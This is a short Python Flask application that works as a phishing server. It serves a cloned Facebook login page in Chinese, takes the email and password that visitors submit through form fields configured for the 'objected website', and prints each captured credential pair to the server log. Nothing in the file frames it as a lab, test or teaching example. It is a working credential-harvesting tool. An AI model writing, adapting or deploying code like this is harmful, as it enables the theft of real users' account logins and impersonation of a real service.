import os

from flask import Flask, session, render_template, request, redirect
from flask_session import Session
from sqlalchemy import create_engine
from sqlalchemy.orm import scoped_session, sessionmaker

from flask import jsonify
import time

app = Flask(__name__)


########################################
##  setting for the objected website  ##
########################################
account_tag_name = "email"
password_input_name = "pass"
########################################
##                                    ##
########################################

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        username = request.form.get(account_tag_name)
        password = request.form.get(password_input_name)
        
        # validate of input
        if not username or not password:
            return redirect('/facebook')

        print("username: {}, password: {}".format(username, password) )
        
        return render_template("login.html", email=username, password=password)

    else:
        return redirect('/facebook')

@app.route('/facebook', methods=["GET", "POST"])
def facebook():
    return render_template("Facebook - 登入或註冊.html")
